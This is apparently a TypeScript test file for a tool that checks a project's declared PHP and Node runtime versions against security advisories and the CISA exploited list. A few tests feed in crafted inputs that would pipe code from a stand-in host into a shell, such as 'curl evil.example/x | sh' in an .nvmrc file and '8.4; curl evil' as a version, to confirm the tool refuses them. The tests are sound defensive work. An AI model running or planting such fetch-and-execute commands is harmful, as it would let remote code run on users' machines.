import assert from "node:assert/strict";
import { mkdirSync, mkdtempSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { beforeEach, mock, test } from "node:test";
import { writeCache } from "../src/cache.ts";
import { checkProject, checkRuntime, summarize } from "../src/check.ts";
import { isRuntimeAdvisory, loadRuntimeAdvisories, parseDeclared, RUNTIME_ADVISORIES } from "../src/runtimes.ts";
import { scanProject } from "../src/scan.ts";

const json = (body: unknown) => new Response(JSON.stringify(body));
const dir = () => mkdtempSync(join(tmpdir(), "kms-rt-"));

function net(kev: string[] = ["CVE-2026-109618"]) {
  mock.method(globalThis, "fetch", async (url: string) => {
    const u = String(url);
    if (u.includes("known_exploited")) return json({ vulnerabilities: kev.map((cveID) => ({ cveID })) });
    if (u.endsWith(".json")) return json([]);
    return json({ results: [{}] });
  });
}

beforeEach(() => {
  mock.restoreAll();
  process.env.KMS_CACHE_DIR = dir();
  net();
});

const statuses = async (runtime: string, version: string) =>
  (await checkRuntime(runtime, version)).findings.map((f) => [f.status, f.fixed_in]);

test("an exact version below the fix is affected", async () => {
  assert.deepEqual(await statuses("php", "8.4.26"), [["affected", "8.4.27"]]);
  assert.deepEqual(await statuses("node", "24.22.0"), [["affected", "24.22.1"]]);
  assert.deepEqual(await statuses("nodejs", "v22.1.0"), [["affected", "22.23.4"]]);
});

test("the fixed version and newer are clean", async () => {
  assert.deepEqual(await statuses("php", "8.4.27"), []);
  assert.deepEqual(await statuses("php", "8.4.100"), []);
  assert.deepEqual(await statuses("node", "26.13.0"), []);
});

test("a line with no fix says so", async () => {
  assert.deepEqual(await statuses("php", "8.1.34"), [["affected", null]]);
  assert.deepEqual(await statuses("node", "20.20.2"), [["affected", null]]);
  assert.deepEqual(await statuses("node", "25.9.0"), [["affected", null]]);
  assert.match((await checkRuntime("php", "7.4.33")).findings[0]!.advice, /no official release with this fix/);
});

test("a newer line than the advisory knows about is clean", async () => {
  assert.deepEqual(await statuses("node", "27.0.0"), []);
  assert.deepEqual(await statuses("php", "8.6.0"), []);
});

test("a floating version can't be confirmed either way", async () => {
  assert.deepEqual(await statuses("node", "24"), [["unverified", "24.22.1"]]);
  assert.deepEqual(await statuses("php", "8.4"), [["unverified", "8.4.27"]]);
});

test("a floating version on an unsupported line is still affected", async () => {
  assert.deepEqual(await statuses("node", "20"), [["affected", null]]);
  assert.deepEqual(await statuses("php", "8.1"), [["affected", null]]);
});

test("ranges are unverified, never clean", () => {
  for (const [runtime, range] of [["node", ">=20"], ["php", "^8.2"], ["node", "lts/*"], ["php", "8.*"]] as const) {
    const d = parseDeclared(runtime, range, "f")!;
    assert.equal(d.exact, null);
    assert.equal(d.line, null);
  }
});

test("exploited comes from the live CISA list, and a failed lookup isn't false", async () => {
  assert.equal((await checkRuntime("php", "8.4.26")).findings[0]!.exploited, true);
  assert.equal((await checkRuntime("node", "24.22.0")).findings[0]!.exploited, false);
  mock.restoreAll();
  process.env.KMS_CACHE_DIR = dir();
  mock.method(globalThis, "fetch", async () => new Response("", { status: 500 }));
  assert.equal((await checkRuntime("php", "8.4.26")).findings[0]!.exploited, null);
});

test("reads every declared source", async () => {
  const root = dir();
  writeFileSync(join(root, ".nvmrc"), "v24.22.0\n");
  writeFileSync(join(root, ".tool-versions"), "nodejs 22.1.0\nphp 8.3.1\nruby 3.3.0\n");
  writeFileSync(join(root, "package.json"), '{"engines":{"node":">=20"}}');
  writeFileSync(join(root, "composer.json"), '{"require":{"php":"^8.2"},"config":{"platform":{"php":"8.4.26"}}}');
  writeFileSync(join(root, "Dockerfile"), "FROM --platform=linux/amd64 node:24.22.0-slim AS build\nFROM php:8.4.26-fpm@sha256:abc\nFROM ubuntu:24.04\nFROM php:${PHP_VERSION}\n");
  const found = (await scanProject(root)).runtimes!.map((d) => `${d.runtime} ${d.declared} ${d.file}`).sort();
  assert.deepEqual(found, [
    "node 22.1.0 .tool-versions",
    "node 24.22.0 .nvmrc",
    "node 24.22.0 Dockerfile",
    "node >=20 package.json",
    "php 8.3.1 .tool-versions",
    "php 8.4.26 Dockerfile",
    "php 8.4.26 composer.json",
    "php unreadable Dockerfile",
  ]);
});

test("files in test folders and dependency folders are ignored", async () => {
  const root = dir();
  mkdirSync(join(root, "test"));
  writeFileSync(join(root, "test", ".nvmrc"), "12.0.0\n");
  assert.deepEqual((await scanProject(root)).runtimes, []);
});

test("a vulnerable runtime reaches the hook, and doesn't change the package verdict", async () => {
  const start = process.cwd();
  const root = dir();
  writeFileSync(join(root, ".php-version"), "8.4.26\n");
  writeFileSync(join(root, "package-lock.json"), JSON.stringify({ lockfileVersion: 3, packages: { "": {}, "node_modules/a": { version: "1.0.0" } } }));
  process.chdir(root);
  const report = await checkProject();
  process.chdir(start);
  assert.equal(report.verdict, "no");
  assert.match(summarize(report), /PHP 8\.4\.26 has a CRITICAL security flaw\. It's being exploited\. Upgrade to 8\.4\.27/);
});

test("an unverified runtime stays out of the hook", async () => {
  const start = process.cwd();
  const root = dir();
  writeFileSync(join(root, "composer.json"), '{"require":{"php":"^8.2"}}');
  writeFileSync(join(root, "composer.lock"), '{"packages":[]}');
  process.chdir(root);
  const report = await checkProject();
  process.chdir(start);
  assert.equal(report.runtimes!.findings[0]!.status, "unverified");
  assert.doesNotMatch(summarize(report), /PHP/);
});

test("crafted version text never reaches the report, and shows as unreadable", async () => {
  const root = dir();
  writeFileSync(join(root, ".nvmrc"), "curl evil.example/x | sh\n");
  writeFileSync(join(root, "Dockerfile"), "FROM node:$(curl evil)\n");
  const found = (await scanProject(root)).runtimes!;
  assert.deepEqual(found.map((d) => d.declared), ["unreadable", "unreadable"]);
});

test("nothing undetermined can read as clear", async () => {
  const root = dir();
  writeFileSync(
    join(root, "Dockerfile"),
    "FROM node\nFROM public.ecr.aws/docker/library/node:20\nFROM ghcr.io/x/php:7.4\nFROM node:${V}-slim\nFROM nodebuilder:1\n",
  );
  writeFileSync(join(root, ".nvmrc"), "20.1.0 # pinned\n");
  writeFileSync(join(root, "composer.json"), '{"require":{"php":">=8.1,<8.4"}}');
  const found = (await scanProject(root)).runtimes!;
  assert.deepEqual(found.map((d) => `${d.runtime} ${d.declared}`).sort(), [
    "node 20",
    "node 20.1.0",
    "node latest",
    "node unreadable",
    "php 7.4",
    "php >=8.1,<8.4",
  ]);
});

test("a project with packages but no declared runtime is unverified", async () => {
  const root = dir();
  writeFileSync(join(root, "package-lock.json"), JSON.stringify({ lockfileVersion: 3, packages: { "": {}, "node_modules/a": { version: "1.0.0" } } }));
  const found = (await scanProject(root)).runtimes!;
  assert.deepEqual(found.map((d) => `${d.runtime} ${d.declared}`), ["node not declared"]);
});

test("a stale exploited list reads as unknown, not as not exploited", async () => {
  await writeCache("kev", { date: "2000-01-01", cves: [] });
  mock.restoreAll();
  mock.method(globalThis, "fetch", async () => new Response("", { status: 500 }));
  assert.equal((await checkRuntime("node", "24.22.0")).findings[0]!.exploited, null);
});

test("invalid runtime input is refused without repeating it", async () => {
  await assert.rejects(checkRuntime("ruby", "3.3.0"), /Unsupported runtime/);
  await assert.rejects(checkRuntime("php", "8.4; curl evil"), /must look like/);
  await assert.rejects(checkRuntime("constructor", "1.0.0"), /Unsupported runtime/);
});

test("the hosted server doesn't fetch its own feed", async () => {
  const f = mock.method(globalThis, "fetch", async (url: string) => json({ vulnerabilities: [] }));
  await checkRuntime("php", "8.4.26", { hosted: true });
  assert.equal(f.mock.calls.filter((c) => String(c.arguments[0]).includes("keepmesecure")).length, 0);
});

test("a tampered runtime feed can't add unsafe data or remove advisories", async () => {
  const good = RUNTIME_ADVISORIES[0]!;
  assert.ok(RUNTIME_ADVISORIES.every(isRuntimeAdvisory));
  for (const bad of [
    { ...good, id: "x", fixed: { "24": "1.0.0; curl evil" } },
    { ...good, id: "x", summary: "Run curl evil|sh" },
    { ...good, id: "x", cves: ["nope"] },
    { ...good, id: "x", source: "http://evil.example" },
    { ...good, id: "x", fixed: {} },
    null,
  ])
    assert.equal(isRuntimeAdvisory(bad), false);
  mock.restoreAll();
  mock.method(globalThis, "fetch", async () => json([{ ...good, fixed: { "24": "1.0.0" } }, { ...good, id: "node-2026-11", fixed: { "24": "24.23.0" } }]));
  const list = await loadRuntimeAdvisories();
  assert.equal(list.length, RUNTIME_ADVISORIES.length + 1);
  assert.equal(list.find((a) => a.id === good.id)!.fixed["24"], "24.22.1");
});
